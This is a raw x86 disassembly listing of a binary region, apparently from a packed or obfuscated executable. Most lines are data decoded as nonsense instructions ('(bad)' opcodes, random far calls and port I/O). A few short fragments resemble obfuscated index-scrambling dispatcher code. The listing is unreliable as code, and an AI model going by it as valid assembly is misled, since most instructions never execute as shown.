  40501a:	or     esp,DWORD PTR [eax-0xd]
  40501d:	inc    eax
  40501e:	jbe    0x404fb4
  405020:	inc    ecx
  405021:	sbb    DWORD PTR [edx+0x3f],eax
  405024:	fld    st(1)
  405026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405027:	mov    dl,0xcf
  405029:	xor    ebp,DWORD PTR [ecx]
  40502b:	inc    esi
  40502c:	mov    ebx,0xf9267f01
  405031:	inc    edi
  405032:	call   0xfaee:0xe086d9d2
  405039:	sub    eax,0x52b35b62
  40503e:	xchg   esp,eax
  40503f:	sub    eax,DWORD PTR [eax]
  405041:	mov    edx,0x2fde733
  405046:	std    
  405047:	in     eax,0x92
  405049:	loop   0x40504b
  40504b:	xchg   ecx,eax
  40504c:	lea    edx,[ebp+0x76a5f239]
  405052:	xor    eax,0x73eba297
  405057:	and    ah,al
  405059:	mov    dl,BYTE PTR [ebp-0x11]
  40505c:	scas   eax,DWORD PTR es:[edi]
  40505d:	repnz les eax,FWORD PTR [edx+0x30b51374]
  405064:	sbb    dh,BYTE PTR [eax-0x3f]
  405067:	in     eax,dx
  405068:	sbb    BYTE PTR [ebp-0x701a4e86],bl
  40506e:	xor    eax,0x8d6f1c3f
  405073:	fisubr WORD PTR [ecx+0x21]
  405076:	pop    esi
  405077:	jbe    0x40506c
  405079:	push   edx
  40507a:	inc    ebp
  40507b:	xor    al,0xc7
  40507d:	xchg   esi,eax
  40507e:	popa   
  40507f:	dec    edi
  405080:	fwait
  405081:	sub    ebx,edx
  405083:	adc    BYTE PTR [edi-0x282e193a],ah
  405089:	sub    eax,DWORD PTR [esi-0x1d]
  40508c:	xchg   ebx,eax
  40508d:	aad    0x59
  40508f:	dec    ebp
  405090:	adc    DWORD PTR [eax],eax
  405092:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405093:	jmp    0x4050be
  405095:	mov    ah,0x4e
  405097:	scas   eax,DWORD PTR es:[edi]
  405098:	jo     0x405077
  40509a:	rol    DWORD PTR [esi],0x60
  40509d:	add    bl,ch
  40509f:	inc    edx
  4050a0:	push   es
  4050a1:	jg     0x405087
  4050a3:	sti    
  4050a4:	mov    edi,0xb8cb48a2
  4050a9:	test   al,0x93
  4050ab:	cs into 
  4050ad:	sbb    dh,dl
  4050af:	inc    edi
  4050b0:	jnp    0x40508d
  4050b2:	in     eax,dx
  4050b3:	imul   ebp,DWORD PTR [edx],0xe6017e10
  4050b9:	jns    0x405057
  4050bb:	mov    ch,0xc6
  4050bd:	pop    ds
  4050be:	cdq    
  4050bf:	nop
  4050c0:	push   edi
  4050c1:	call   0xef4859a1
  4050c6:	fidivr DWORD PTR [edi-0x327298]
  4050cc:	sub    edi,eax
  4050ce:	add    edi,DWORD PTR [ebp+0x10]
  4050d1:	xor    edx,ecx
  4050d3:	add    edx,esi
  4050d5:	cmp    edx,edi
  4050d7:	ja     0x4059fd
  4050dd:	push   ebx
  4050de:	jmp    0x4053d8
  4050e3:	mov    esi,0x327298
  4050e8:	jmp    0x4053d8
  4050ed:	aas    
  4050ee:	rol    dh,1
  4050f0:	int3   
  4050f1:	aad    0xd2
  4050f3:	(bad)  
  4050f5:	dec    esp
  4050f6:	sub    BYTE PTR [ebx+0x22d895fe],bh
  4050fc:	add    eax,0x787830e8
  405101:	dec    ebp
  405102:	jle    0x40517c
  405104:	js     0x405177
  405106:	sub    al,0x30
  405108:	push   ds
  405109:	(bad)  
  40510a:	lock psrad mm3,mm1
  40510e:	call   DWORD PTR [eax+0x1b]
  405111:	jmp    0x405184
  405113:	or     ecx,DWORD PTR [edi]
  405115:	inc    edx
  405116:	adc    dh,ah
  405118:	inc    ecx
  405119:	shl    BYTE PTR [ebx+0x7a343132],1
  40511f:	cmp    al,0x1b
  405121:	jo     0x4050b9
  405123:	aad    0x2
  405125:	pushf  
  405126:	or     eax,esi
  405128:	arpl   WORD PTR [eax+0x7],bx
  40512b:	and    DWORD PTR ds:0xcfff178c,ebp
  405131:	jae    0x4050cc
  405133:	pop    es
  405134:	add    BYTE PTR [ecx-0x3095d66b],ch
  40513a:	nop
  40513b:	daa    
  40513c:	or     dl,BYTE PTR [ebx-0x1aa799cd]
  405142:	pop    ecx
  405143:	mov    esi,0xddf8fda1
  405148:	xor    eax,0x520720f4
  40514d:	aam    0x5c
  40514f:	mov    esp,0xeeb379a2
  405154:	aas    
  405155:	mov    cl,0x3d
  405157:	call   0xe062fe3b
  40515c:	jmp    0x87fab5b4
  405161:	les    ecx,FWORD PTR [ebx-0x44e62d46]
  405167:	fmul   st(3),st
  405169:	and    BYTE PTR [ecx-0x7390c3b7],bh
  40516f:	or     eax,0x6e5066e5
  405174:	lods   al,BYTE PTR ds:[esi]
  405175:	bound  eax,QWORD PTR [edx]
  405177:	xor    edi,DWORD PTR [ebx+0x11]
  40517a:	test   al,0x94
  40517c:	sbb    eax,0xd636c5e5
  405181:	ret    
  405182:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405183:	int    0x65
  405185:	push   ebx
  405186:	dec    esp
  405187:	sub    eax,0x845cebb9
  40518c:	pop    DWORD PTR [esi+ebx*2]
  40518f:	dec    esi
  405190:	sub    eax,0xd6dbd322
  405195:	pop    es
  405196:	xchg   edx,eax
  405197:	(bad)  
  405198:	jmp    0x405183
  40519a:	es out dx,eax
  40519c:	ja     0x4051c6
  40519e:	fs (bad) 
  4051a0:	jo     0x4051d4
  4051a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051a3:	bound  ebp,QWORD PTR [eax+edi*2+0x85fb545]
  4051aa:	ret    
  4051ab:	call   0xa717:0x229b223b
  4051b2:	sbb    BYTE PTR [ebp-0x5758893f],cl
  4051b8:	cmp    esp,DWORD PTR [edx+eax*1]
  4051bb:	mov    esi,0xbca1bf07
  4051c0:	retf   
  4051c1:	retf   0xf811
  4051c4:	push   ss
  4051c5:	lock sub BYTE PTR [ebx+0x6dbb96fa],0x80
  4051cd:	adc    esi,DWORD PTR [edi-0x7bb70d30]
  4051d3:	mov    bl,0xe4
  4051d5:	push   cs
  4051d6:	add    al,0x11
  4051d8:	sti    
  4051d9:	jp     0x4051df
  4051db:	gs sbb al,0xdb
  4051de:	dec    esi
  4051df:	sbb    cl,BYTE PTR [edi]
  4051e1:	push   ebp
  4051e2:	mov    esp,0x8fa50d94
  4051e7:	add    al,0x74
  4051e9:	jmp    0xe04efedc
  4051ee:	or     ebp,DWORD PTR [ebp-0x9fc4068]
  4051f4:	add    al,0x7f
  4051f6:	sub    al,0x32
  4051f8:	pop    esi
  4051f9:	shl    DWORD PTR [eax-0x4],cl
  4051fc:	ret    
  4051fd:	fstp   DWORD PTR [ecx-0x34]
  405200:	jmp    edi
  405202:	popa   
  405203:	push   ecx
  405204:	pop    ecx
  405205:	retf   
  405206:	jnp    0x4051c6
  405208:	jge    0x4051ff
  40520a:	dec    esp
  40520b:	push   esi
  40520c:	xchg   esi,eax
  40520d:	xchg   esi,eax
  40520e:	stos   DWORD PTR es:[edi],eax
  40520f:	xchg   BYTE PTR [ebp+0x59],al
  405212:	lahf   
  405213:	pop    ss
  405214:	in     eax,dx
  405215:	jge    0x40522e
  405217:	fs pop eax
  405219:	test   DWORD PTR [edi],edx
  40521b:	inc    edx
  40521c:	lods   al,BYTE PTR ds:[esi]
  40521d:	jno    0x40525b
  40521f:	xchg   ebx,eax
  405220:	(bad)  
  405221:	fbstp  TBYTE PTR [eax+0x5d]
  405224:	cmp    al,0xd1
  405226:	xor    BYTE PTR [esi],ah
  405228:	pop    edx
  405229:	xchg   ebx,eax
  40522a:	mov    ds:0xbc323dfb,eax
  40522f:	jbe    0x40529d
  405231:	mov    ecx,0x9fc2d172
  405236:	dec    edx
  405237:	retf   0xb374
  40523a:	lods   al,BYTE PTR ds:[esi]
  40523b:	dec    edx
  40523c:	mov    bl,0x46
  40523e:	xor    DWORD PTR es:[ebx+0x3f],0x10533045
  405246:	xchg   ecx,eax
  405247:	popa   
  405248:	xor    cl,dl
  40524a:	mov    ebp,0x29b6ad20
  40524f:	add    ecx,DWORD PTR [edx+0x39]
  405252:	mov    dl,BYTE PTR [eax+0x2e]
  405255:	dec    ecx
  405256:	es jmp 0x767a:0x1983566e
  40525e:	ret    
  40525f:	mov    ds:0x483af24a,al
  405264:	loopne 0x40521b
  405266:	out    0x97,al
  405268:	popf   
  405269:	push   ecx
  40526a:	pop    esp
  40526b:	mov    bl,0xa4
  40526d:	adc    edx,DWORD PTR [ecx]
  40526f:	jmp    0xf1161a32
  405274:	dec    ebx
  405275:	push   edx
  405276:	retf   
  405277:	int3   
  405278:	es xor eax,0xcac48d36
  40527e:	xor    eax,0xfd08af5
  405283:	and    ebp,DWORD PTR [edx-0x6f33e5bd]
  405289:	sbb    esp,edi
  40528b:	stc    
  40528c:	pop    ecx
  40528d:	retf   
  40528e:	sti    
  40528f:	sbb    dl,BYTE PTR [edi+0x26]
  405292:	test   al,0xbd
  405294:	ds inc edx
  405296:	xor    al,0x37
  405298:	bound  esp,QWORD PTR [edi-0x13]
  40529b:	adc    dl,BYTE PTR [ebp-0x47]
  40529e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40529f:	fsubr  QWORD PTR [edi-0x52]
  4052a2:	or     esp,ecx
  4052a4:	mov    al,ds:0xe58fc52
  4052a9:	adc    DWORD PTR [edi-0x29db212a],esp
  4052af:	je     0x405288
  4052b1:	stos   DWORD PTR es:[edi],eax
  4052b2:	or     eax,DWORD PTR [edi]
  4052b4:	mov    ecx,esi
  4052b6:	fcomp  QWORD PTR [eax+eax*1]
  4052b9:	fcomp  QWORD PTR [ebx]
  4052bb:	scas   eax,DWORD PTR es:[edi]
  4052bc:	inc    ebx
  4052bd:	sbb    BYTE PTR [eax-0x4d910494],dl
  4052c3:	pop    edi
  4052c4:	in     eax,0xf
  4052c6:	sbb    eax,0xc25f266f
  4052cb:	push   cs
  4052cc:	xor    al,ch
  4052ce:	nop
  4052cf:	mov    edi,0x62c57330
  4052d4:	test   BYTE PTR [ebx+esi*4-0x79],al
  4052d8:	je     0x4052c3
  4052da:	ret    0xfcca
  4052dd:	push   ds
  4052de:	call   0xad91:0xdbcbdf23
  4052e5:	push   ebp
  4052e6:	mov    ebx,0xc983a1ea
  4052eb:	inc    edx
  4052ec:	dec    esi
  4052ed:	int    0xf9
  4052ef:	inc    eax
  4052f0:	je     0x405277
  4052f2:	jp     0x4052c4
  4052f4:	xor    al,0x20
  4052f6:	ds push 0xae228ad4
  4052fc:	cdq    
  4052fd:	xchg   edi,ebx
  4052ff:	imul   ebp,DWORD PTR [ebp+edi*2-0x71f5c871],0xfcbc829e
  40530a:	xor    DWORD PTR [edx+0x20],0x11b1aa39
  405311:	arpl   WORD PTR [ebx-0x3e],ax
  405314:	out    0x1e,al
  405316:	call   0xd34a4553
  40531b:	(bad)  
  40531c:	cmc    
  40531d:	ds jne 0x40530b
  405320:	in     al,dx
  405321:	add    DWORD PTR [edi],eax
  405323:	mov    al,ds:0x3f62c27a
  405328:	adc    DWORD PTR [edx+0x5baaad56],ecx
  40532e:	jecxz  0x405332
  405330:	and    dh,BYTE PTR [edx]
  405332:	rep ins BYTE PTR es:[edi],dx
  405334:	xchg   esp,eax
  405335:	adc    ebp,edx
  405337:	scas   al,BYTE PTR es:[edi]
  405338:	fcomp  DWORD PTR [ecx]
  40533a:	dec    esi
  40533b:	lods   al,BYTE PTR ds:[esi]
  40533c:	pop    ebx
  40533d:	inc    ecx
  40533e:	in     eax,dx
  40533f:	mov    ah,0xa1
  405341:	mov    dh,0x36
  405343:	xor    BYTE PTR [ecx-0x11],0x7f
  405347:	xchg   edi,eax
  405348:	fst    QWORD PTR [edi-0x13]
  40534b:	sahf   
  40534c:	mov    bh,0x63
  40534e:	push   ss
  40534f:	sub    al,dl
  405351:	popf   
  405352:	or     DWORD PTR [edi-0x56bd680e],edi
  405358:	int    0x2d
  40535a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40535b:	mov    eax,0x17e5e767
  405360:	push   ecx
  405361:	aas    
  405362:	mov    ebx,0xfeb5f3f9
  405367:	xchg   esp,eax
  405368:	popf   
  405369:	shr    bh,0x1
  40536c:	ss loop 0x40539b
  40536f:	mov    esi,0x52cef69a
  405374:	mov    bl,BYTE PTR [edi+0x5d]
  405377:	mov    esp,0x7e323687
  40537c:	mov    bh,BYTE PTR [esi+edx*2-0x334a5169]
  405383:	jno    0x405374
  405385:	add    eax,0x559b0c8
  40538a:	mov    WORD PTR [ebp+0x60],?
  40538d:	pop    eax
  40538e:	sahf   
  40538f:	loope  0x4053d7
  405391:	mov    bh,0x15
  405393:	or     al,0x52
  405395:	sbb    esi,ecx
  405397:	inc    esi
  405398:	in     al,0x63
  40539a:	pop    es
  40539b:	add    ch,ch
  40539d:	jne    0x405413
  40539f:	(bad)  
  4053a0:	cdq    
  4053a1:	jecxz  0x405340
  4053a3:	ins    BYTE PTR es:[edi],dx
  4053a4:	ret    
  4053a5:	(bad)  
  4053a6:	mov    esp,0xb2eedec8
  4053ab:	dec    ebp
  4053ac:	or     ecx,esi
  4053ae:	mov    ?,WORD PTR [ebx-0x5e856f2d]
  4053b4:	aaa    
  4053b5:	ss inc edi
  4053b7:	stc    
  4053b8:	aad    0x51
  4053ba:	jg     0x4053f5
  4053bc:	sub    eax,0x521ca6b3
  4053c1:	dec    ecx
  4053c2:	inc    edx
  4053c3:	daa    
  4053c4:	or     dl,BYTE PTR [ebp-0x61958534]
  4053ca:	gs pop es
  4053cc:	mov    al,0x2e
  4053ce:	rol    esi,1
  4053d0:	mov    al,cs:0x55d9e44f
  4053d6:	sar    ebp,cl
  4053d8:	mov    eax,DWORD PTR [ebp-0x8]
  4053db:	jmp    0x4056cb
  4053e0:	int    0xd3
  4053e2:	rol    ah,cl
  4053e4:	ror    cl,cl
  4053e6:	aad    0xd9
  4053e8:	inc    edx
  4053e9:	jecxz  0x40544a
  4053eb:	fcom   QWORD PTR [eax]
  4053ed:	sti    
  4053ee:	hlt    
  4053ef:	popa   
  4053f0:	cmp    eax,0x4d787835
  4053f5:	jle    0x40546f
  4053f7:	js     0x4053db
  4053f9:	(bad)  [edi-0x17449228]
  4053ff:	jae    0x40542d
  405401:	cmp    al,0x10
  405403:	popf   
  405404:	mov    ss,WORD PTR [ecx+0x6e]
  405407:	shl    BYTE PTR [ecx+0xd],0x7b
  40540b:	pop    ebp
  40540c:	retf   0xf557
  40540f:	dec    ebp
  405410:	mov    ch,0xfb
  405412:	mov    esp,0x8924e687
  405417:	cmp    DWORD PTR [ebx+0x1bbb77f2],esp
  40541d:	loope  0x405464
  40541f:	cmp    eax,0x340862fa
  405424:	outs   dx,BYTE PTR ds:[esi]
  405425:	and    DWORD PTR [esi+0x11],edi
  405428:	aas    
  405429:	dec    esi
  40542a:	addr16 mov dl,ch
  40542d:	(bad)  
  40542e:	mov    eax,ds:0xc7da0b0e
  405433:	ins    DWORD PTR es:[edi],dx
  405434:	int3   
  405435:	in     al,0x70
  405437:	mov    bl,0xb1
  405439:	pop    es
  40543a:	dec    ebp
  40543b:	or     al,0xa2
  40543d:	mov    cl,bl
  40543f:	scas   eax,DWORD PTR es:[edi]
  405440:	push   edi
  405441:	fs pop ds
  405443:	std    
  405444:	inc    ebp
  405445:	int3   
  405446:	push   edx
  405447:	test   cl,dh
  405449:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40544a:	mov    dh,BYTE PTR [ebp-0x6c]
  40544d:	sub    al,0x29
  40544f:	pop    ebx
  405450:	adc    cl,al
  405452:	mov    eax,0x61535e40
  405457:	dec    edx
  405458:	je     0x40542e
  40545a:	aad    0x9a
  40545c:	push   esi
  40545d:	inc    edx
  40545e:	dec    esp
  40545f:	mov    ebp,0xa8e298ec
  405464:	ins    BYTE PTR es:[edi],dx
  405465:	ss es lock xor al,0xa8
  40546a:	push   esi
  40546b:	and    ebp,ecx
  40546d:	adc    ebx,DWORD PTR [eax+0x3bcd7c58]
  405473:	lea    esi,[edi-0x57524076]
  405479:	lahf   
  40547a:	jmp    0xc0ce01da
  40547f:	mov    DWORD PTR [ebp-0x763584b8],ebp
  405485:	mov    al,ds:0xe8f8c3dc
  40548a:	rcr    BYTE PTR [eax],cl
  40548c:	pop    es
  40548d:	and    DWORD PTR ds:0xda353042,ecx
  405493:	pushf  
  405494:	cmp    cl,BYTE PTR [edi]
  405496:	ret    
  405497:	sbb    al,0x72
  405499:	sbb    bh,BYTE PTR [edx+ebp*2-0x15331ab8]
  4054a0:	and    BYTE PTR [edi],0x2d
  4054a3:	xchg   esi,eax
  4054a4:	(bad)  
  4054a5:	popa   
  4054a6:	mov    al,ds:0x7d8c0990
  4054ab:	mov    bl,0xcf
  4054ad:	pop    edi
  4054ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054af:	fisttp QWORD PTR [ebx]
  4054b1:	sub    ch,bh
  4054b3:	pop    esi
  4054b4:	dec    esi
  4054b5:	loop   0x4054da
  4054b7:	push   eax
  4054b8:	sub    edi,DWORD PTR ds:0x486beed7
  4054be:	mov    ch,0xfa
  4054c0:	pushf  
  4054c1:	(bad)  
  4054c2:	sbb    edx,ebp
  4054c4:	adc    BYTE PTR fs:[edi+0x6d387efc],0x97
  4054cc:	retf   
  4054cd:	add    al,0x6a
  4054cf:	das    
  4054d0:	or     BYTE PTR [esp+esi*2+0x68221883],0x0
  4054d8:	addr16 add al,0x33
  4054db:	push   edi
  4054dc:	push   edx
  4054dd:	jmp    0x4054cd
  4054df:	mov    bl,0x1a
  4054e1:	sti    
  4054e2:	andps  xmm5,XMMWORD PTR [eax-0x77]
  4054e6:	mov    esp,0x2bdd7f96
  4054eb:	test   BYTE PTR [esi],dh
  4054ed:	or     al,0x64
  4054ef:	gs pop ebx
  4054f1:	into   
  4054f2:	xchg   edx,eax
  4054f3:	inc    eax
  4054f4:	ja     0x405573
  4054f6:	fimul  WORD PTR [ebx+eax*1]
  4054f9:	into   
  4054fa:	jmp    FWORD PTR [esi+0x4e]
  4054fd:	inc    edi
  4054fe:	(bad)  
  4054ff:	frstor [edx*1-0x34731e9b]
  405506:	jl     0x405518
  405508:	dec    esp
  405509:	push   ss
  40550a:	bound  edx,QWORD PTR [esi+0x5a680c86]
  405510:	out    dx,al
  405511:	clc    
  405512:	push   es
  405513:	fdiv   DWORD PTR [eax+ebx*8]
  405516:	fnstsw WORD PTR [ebx]
  405518:	lahf   
  405519:	xor    BYTE PTR [ecx],bh
  40551b:	std    
  40551c:	sub    DWORD PTR [edx+0x53],ecx
  40551f:	lods   al,BYTE PTR ds:[esi]
  405520:	xor    ah,BYTE PTR [ecx-0x32ab4e84]
  405526:	mov    ch,0xde
  405528:	lea    edx,[esi]
  40552a:	fnstsw WORD PTR [ecx]
  40552c:	mov    al,ds:0xf907f84c
  405531:	test   DWORD PTR [edi],edx
  405533:	pushf  
  405534:	mov    esp,0xaa997387
  405539:	lods   eax,DWORD PTR ds:[esi]
  40553a:	or     eax,0x54cdba3c
  40553f:	mov    eax,ds:0x3901f2b4
  405544:	inc    esp
  405545:	cmp    edx,0xffffffb5
  405548:	js     0x4054d9
  40554a:	iret   
  40554b:	jb     0x405588
  40554d:	stos   DWORD PTR es:[edi],eax
  40554e:	ss aam 0xaf
  405551:	clc    
  405552:	mov    al,0x4b
  405554:	mov    esi,edi
  405556:	mov    esp,ecx
  405558:	jnp    0x4055be
  40555a:	mov    ch,0xd0
  40555c:	xchg   esi,eax
  40555d:	sahf   
  40555e:	fidivr DWORD PTR [ebx-0x53]
  405561:	adc    BYTE PTR [ebp+0x22],dh
  405564:	jg     0x4055c3
  405566:	aas    
  405567:	(bad)  ds:0x1ad33299
  40556d:	mov    ds:0xdaa77d05,al
  405572:	inc    edi
  405573:	test   al,0x6d
  405575:	mov    al,0xa2
  405577:	mov    ss,WORD PTR [esi]
  405579:	xor    eax,0x802e8234
  40557e:	pushf  
  40557f:	ret    
  405580:	ret    0x43c2
  405583:	lock ds ds inc eax
  405587:	aam    0x9c
  405589:	cmp    al,0xdf
  40558b:	test   DWORD PTR [ecx+eiz*4],eax
  40558e:	add    esi,DWORD PTR [esi+0x6f]
  405591:	out    0xe7,al
  405593:	jg     0x405580
  405595:	je     0x40559a
  405597:	loop   0x405594
  405599:	(bad)  
  40559a:	pushf  
  40559b:	repnz outs dx,BYTE PTR ds:[si]
  40559e:	sbb    DWORD PTR [ebx-0x57],ebx
  4055a1:	(bad)  
  4055a2:	call   FWORD PTR ds:0x46df20c8
  4055a8:	sub    eax,0x55429961
  4055ad:	in     eax,dx
  4055ae:	shl    BYTE PTR [esp+eiz*2-0x66],cl
  4055b2:	jo     0x40561b
  4055b4:	(bad)  
  4055b5:	jmp    0x8b43:0x5e5a478d
  4055bc:	lock mov ah,bl
  4055bf:	test   eax,0x2f4a0688
  4055c4:	mov    BYTE PTR [esi+edi*1-0x91cb4ca],cl
  4055cb:	inc    ecx
  4055cc:	neg    DWORD PTR [esi]
  4055ce:	fcom   st(3)
  4055d0:	ror    BYTE PTR [esi+0x3686179],0xdd
  4055d7:	nop
  4055d8:	add    esp,eax
  4055da:	aam    0x5e
  4055dc:	xor    edi,DWORD PTR [esi]
  4055de:	mov    esi,0xbda3bb0b
  4055e3:	adc    DWORD PTR [edi+0x2c],ecx
  4055e6:	fdivr  st(0),st
  4055e8:	dec    edi
  4055e9:	cmp    al,0x31
  4055eb:	or     BYTE PTR [edx+0x4f],0xdb
  4055ef:	mov    ds:0xc125221f,al
  4055f4:	pop    esi
  4055f5:	shl    eax,0x27
  4055f8:	icebp  
  4055f9:	lods   eax,DWORD PTR ds:[esi]
  4055fa:	cs add bl,dl
  4055fd:	arpl   WORD PTR [ecx-0x75e62deb],di
  405603:	xor    eax,0xdad9e802
  405608:	in     eax,dx
  405609:	push   esp
  40560a:	mov    DWORD PTR ds:0x6baa91f9,esi
  405610:	psubsw mm7,QWORD PTR [ebp+0x33]
  405614:	imul   esi,DWORD PTR [ebp+eax*4+0x9b2bdaf],0xffffffd2
  40561c:	rol    BYTE PTR [eax-0x2dd48ed2],0xbb
  405623:	dec    edi
  405624:	pop    edx
  405625:	stos   BYTE PTR es:[edi],al
  405626:	add    esi,DWORD PTR [ebx+0x687e7f4c]
  40562c:	imul   esi,DWORD PTR [eax],0xffffff91
  40562f:	xor    al,0x76
  405631:	and    DWORD PTR [ebx+0x5813eb3c],esi
  405637:	fcom   DWORD PTR [ebx+0x1d]
  40563a:	or     BYTE PTR [ebp-0x11dcaac9],cl
  405640:	stc    
  405641:	mov    cl,0xc
  405643:	or     bh,BYTE PTR [edi+0x1c8c90a5]
  405649:	push   es
  40564a:	jg     0x4055f0
  40564c:	xchg   esi,eax
  40564d:	and    BYTE PTR [esi-0xe777f13],0x2c
  405654:	mov    edx,0xabc9d297
  405659:	ins    DWORD PTR es:[edi],dx
  40565a:	or     al,0x6a
  40565c:	iret   
  40565d:	cmc    
  40565e:	inc    ebp
  40565f:	inc    ebx
  405660:	and    al,0x34
  405662:	bound  ebx,QWORD PTR [ebx-0x19]
  405665:	push   eax
  405666:	bound  edi,QWORD PTR [ebp-0x6f874582]
  40566c:	test   ebp,0x78b88401
  405672:	mov    al,BYTE PTR [ebx]
  405674:	fadd   DWORD PTR ds:0x7a8139d3
  40567a:	cwde   
  40567b:	ins    BYTE PTR es:[edi],dx
  40567c:	xchg   DWORD PTR [edx],esi
  40567e:	imul   ebp,DWORD PTR [ebx],0xffffffea
  405681:	push   0xf3d6405b
  405686:	xor    DWORD PTR [ebx+0x1e1cd004],esp
  40568c:	icebp  
  40568d:	call   0xdb1a8dd6
  405692:	mov    cl,0xe4
  405694:	adc    DWORD PTR [ecx+0x13],ebx
  405697:	bsr    ebp,ebp
  40569a:	into   
  40569b:	jmp    0x35e131d2
  4056a0:	les    edi,FWORD PTR [ecx+0x4f]
  4056a3:	leave  
  4056a4:	popa   
  4056a5:	aad    0x56
  4056a7:	outs   dx,BYTE PTR ds:[esi]
  4056a8:	or     esp,DWORD PTR [edx]
  4056aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056ab:	ins    BYTE PTR es:[edi],dx
  4056ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056ad:	fmul   DWORD PTR [ebp+0x6c461e31]
  4056b3:	call   0xbb2838f4
  4056b8:	stos   BYTE PTR es:[edi],al
  4056b9:	jns    0x4056bb
  4056bb:	and    dh,bh
  4056bd:	(bad)  
  4056be:	cld    
  4056bf:	stos   DWORD PTR es:[edi],eax
  4056c0:	jmp    0x936165cc
  4056c5:	xor    eax,DWORD PTR [edx]
  4056c7:	xor    BYTE PTR [esi+0x7d8bb3dd],ah
  4056cd:	cld    
  4056ce:	xor    edi,ecx
  4056d0:	add    edi,esi
  4056d2:	mov    esi,DWORD PTR [ebp+0x8]
  4056d5:	imul   edi,edx
  4056d8:	mov    ebx,DWORD PTR [ebp+0xc]
  4056db:	xor    eax,ecx
  4056dd:	add    eax,edx
  4056df:	mov    al,BYTE PTR [ebx+eax*1+0x327298]
  4056e6:	mov    BYTE PTR [edi+esi*1],al
  4056e9:	mov    eax,DWORD PTR [ebp-0x4]
  4056ec:	xor    eax,ecx
  4056ee:	lea    edx,[edx+eax*1+0x327298]
  4056f5:	mov    eax,DWORD PTR [ebp-0x4]
  4056f8:	xor    eax,ecx
  4056fa:	mov    esi,0xffcd8d68
  4056ff:	sub    esi,eax
  405701:	jmp    0x4059f1
  405706:	rol    esi,cl
  405708:	retf   0xd9c2
  40570b:	ret    0xd5db
  40570e:	shr    DWORD PTR [edx],0xd2
  405711:	ins    BYTE PTR es:[edi],dx
  405712:	call   0x1324ce23
  405717:	cmp    bh,BYTE PTR [eax+0x78]
  40571a:	dec    ebp
  40571b:	jle    0x405795
  40571d:	js     0x4056b4
  40571f:	lea    esi,[ecx+0x746408fe]
  405725:	mov    ?,WORD PTR [esi-0x63387675]
  40572b:	mov    al,0xee
  40572d:	lods   eax,DWORD PTR ds:[esi]
  40572e:	dec    esi
  40572f:	mov    bl,0xcd
  405731:	test   eax,0xff0cb807
  405736:	fdivr  DWORD PTR [ecx-0x2c7d803f]
  40573c:	sahf   
  40573d:	cs aad 0xfc
  405740:	pop    ecx
  405741:	outs   dx,BYTE PTR ds:[esi]
  405742:	stos   DWORD PTR es:[edi],eax
  405743:	int3   
  405744:	pop    ds
  405745:	or     BYTE PTR [edx-0x20],ch
  405748:	int3   
  405749:	and    al,0x18
  40574b:	mov    ecx,0x180d939c
  405750:	xchg   esp,eax
  405751:	loopne 0x4057c9
  405753:	shl    al,cl
  405755:	mov    dh,0x21
  405757:	mov    cs,WORD PTR [edx]
  405759:	into   
  40575a:	call   0xa7f1db03
  40575f:	xchg   esp,eax
  405760:	jmp    0xba13:0x75933ac8
  405767:	imul   esp,DWORD PTR [ebx+ebp*1+0x4dbd57af],0xffffff88
  40576f:	pop    eax
  405770:	repnz add al,0x2f
  405773:	push   ss
  405774:	(bad)  
  405775:	addr16 sub eax,0x4f986785
  40577b:	cmp    cl,BYTE PTR [esp+ebx*4+0x1c064a2d]
  405782:	cwde   
  405783:	mov    gs,WORD PTR [esi-0x2b1db461]
  405789:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40578a:	loope  0x4057be
  40578c:	(bad)  
  40578d:	cmc    
  40578e:	sub    al,0xe9
  405790:	sub    BYTE PTR ds:0x2727d209,0xd9
  405797:	inc    esi
  405798:	pop    ds
  405799:	call   0x6d68:0x20b6e645
  4057a0:	and    ecx,edi
  4057a2:	(bad)  
  4057a3:	out    0xa5,al
  4057a5:	pusha  
  4057a6:	add    al,0xa7
  4057a8:	add    eax,0x15e7322f
  4057ad:	adc    ebp,DWORD PTR [ecx+0x6d8c9fba]
  4057b3:	sahf   
  4057b4:	in     eax,dx
  4057b5:	call   0x7a0c7903
  4057ba:	loop   0x4057fb
  4057bc:	dec    ecx
  4057bd:	mov    al,0xf9
  4057bf:	mov    al,0x84
  4057c1:	int3   
  4057c2:	jl     0x40576d
  4057c4:	out    dx,al
  4057c5:	xor    BYTE PTR [esi],bl
  4057c7:	dec    esp
  4057c8:	test   al,0x4
  4057ca:	cdq    
  4057cb:	addr16 dec sp
  4057ce:	pusha  
  4057cf:	add    dh,BYTE PTR [ebp-0x611275aa]
  4057d5:	adc    al,0x46
  4057d7:	mov    edx,0xde03707c
  4057dc:	clc    
  4057dd:	fs mov ebp,0xe2e18f5e
  4057e3:	or     al,0x6c
  4057e5:	push   esi
  4057e6:	fiadd  WORD PTR [edi+ecx*4+0x4a]
  4057ea:	rcr    DWORD PTR [edi-0x1e4ae78b],0xb5
  4057f1:	sbb    DWORD PTR [edi+0x2c2dd3f5],ecx
  4057f7:	push   ss
  4057f8:	in     al,0x0
  4057fa:	push   eax
  4057fb:	rcr    BYTE PTR [ecx],1
  4057fd:	cli    
  4057fe:	add    DWORD PTR [edi+0x51],esi
  405801:	mov    ch,BYTE PTR [ebx]
  405803:	or     BYTE PTR [ebx+0x3f],0x6e
  405807:	adc    eax,DWORD PTR [esi-0x43ba44ad]
  40580d:	inc    ebx
  40580e:	arpl   WORD PTR [ebx+0x20],cx
  405811:	fs pop esi
  405813:	and    eax,ebx
  405815:	mov    ah,0xff
  405817:	out    dx,al
  405818:	lods   al,BYTE PTR ds:[esi]
  405819:	(bad)  
  40581a:	jnp    0x405815
  40581c:	(bad)  
  40581d:	lods   al,BYTE PTR ds:[esi]
  40581e:	inc    edi
  40581f:	retf   0xca3d
  405822:	mov    esp,DWORD PTR [ecx+eax*8-0x78]
  405826:	scas   eax,DWORD PTR es:[edi]
  405827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
